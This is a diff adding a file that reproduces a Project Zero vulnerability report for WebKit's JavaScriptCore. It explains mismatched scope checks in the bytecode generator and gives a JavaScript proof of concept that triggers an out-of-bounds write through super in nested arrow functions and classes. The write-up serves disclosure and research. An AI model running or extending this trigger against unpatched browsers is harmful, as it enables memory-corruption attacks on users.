@@ -1,0 +1,96 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1173
+
+When a super expression is used in an arrow function, the following code, which generates bytecode, is called.
+
+if (needsToUpdateArrowFunctionContext() && !codeBlock->isArrowFunction()) {
+    bool canReuseLexicalEnvironment = isSimpleParameterList;
+    initializeArrowFunctionContextScopeIfNeeded(functionSymbolTable, canReuseLexicalEnvironment);
+    emitPutThisToArrowFunctionContextScope();
+    emitPutNewTargetToArrowFunctionContextScope();
+    emitPutDerivedConstructorToArrowFunctionContextScope();
+}
+
+Here's |emitPutDerivedConstructorToArrowFunctionContextScope|.
+
+void BytecodeGenerator::emitPutDerivedConstructorToArrowFunctionContextScope()
+{
+    if ((isConstructor() && constructorKind() == ConstructorKind::Extends) || m_codeBlock->isClassContext()) {
+        if (isSuperUsedInInnerArrowFunction()) {
+            ASSERT(m_arrowFunctionContextLexicalEnvironmentRegister);
+            
+            Variable protoScope = variable(propertyNames().builtinNames().derivedConstructorPrivateName());
+            emitPutToScope(m_arrowFunctionContextLexicalEnvironmentRegister, protoScope, &m_calleeRegister, DoNotThrowIfNotFound, InitializationMode::Initialization);
+        }
+    }
+}
+
+|emitPutToScope| is directly called without resolving the scope. This means the scope |m_arrowFunctionContextLexicalEnvironmentRegister| must have a place for |derivedConstructorPrivateName|. And that place is secured in the following method.
+
+void BytecodeGenerator::initializeArrowFunctionContextScopeIfNeeded(SymbolTable* functionSymbolTable, bool canReuseLexicalEnvironment)
+{
+    ASSERT(!m_arrowFunctionContextLexicalEnvironmentRegister);
+
+    if (canReuseLexicalEnvironment && m_lexicalEnvironmentRegister) {
+        ...
+        if (isConstructor() && constructorKind() == ConstructorKind::Extends && isSuperUsedInInnerArrowFunction()) {
+            offset = functionSymbolTable->takeNextScopeOffset(NoLockingNecessary);
+            functionSymbolTable->set(NoLockingNecessary, propertyNames().builtinNames().derivedConstructorPrivateName().impl(), SymbolTableEntry(VarOffset(offset)));
+        }
+        ...
+    }
+    ...
+}
+
+But the problem is that the checks in |emitPutDerivedConstructorToArrowFunctionContextScope| and |initializeArrowFunctionContextScopeIfNeeded| are slightly diffrent.
+
+BytecodeGenerator::initializeArrowFunctionContextScopeIfNeeded:
+if (isConstructor() && constructorKind() == ConstructorKind::Extends && isSuperUsedInInnerArrowFunction())
+
+BytecodeGenerator::emitPutDerivedConstructorToArrowFunctionContextScope:
+if ((isConstructor() && constructorKind() == ConstructorKind::Extends) || m_codeBlock->isClassContext()) {
+    if (isSuperUsedInInnerArrowFunction()) {
+
+Note: " || m_codeBlock->isClassContext()".
+
+So, in a certain case, it fails to secure the place for |derivedConstructorPrivateName|, but |emitPutToScope| is called, which results in an OOB write.
+
+PoC:
+*/
+
+let args = new Array(0x10000);
+args.fill();
+args = args.map((_, i) => 'a' + i).join(', ');
+
+let gun = eval(`(function () {
+    class A {
+
+    }
+
+    class B extends A {
+        constructor(${args}) {
+            () => {
+                ${args};
+                super();
+            };
+
+            class C {
+                constructor() {
+                }
+
+                trigger() {
+                    (() => {
+                        super.x;
+                    })();
+                }
+            }
+
+            return new C();
+        }
+    }
+
+    return new B();
+})()`);
+
+for (let i = 0; i < 0x10000; i++)
+    gun.trigger();
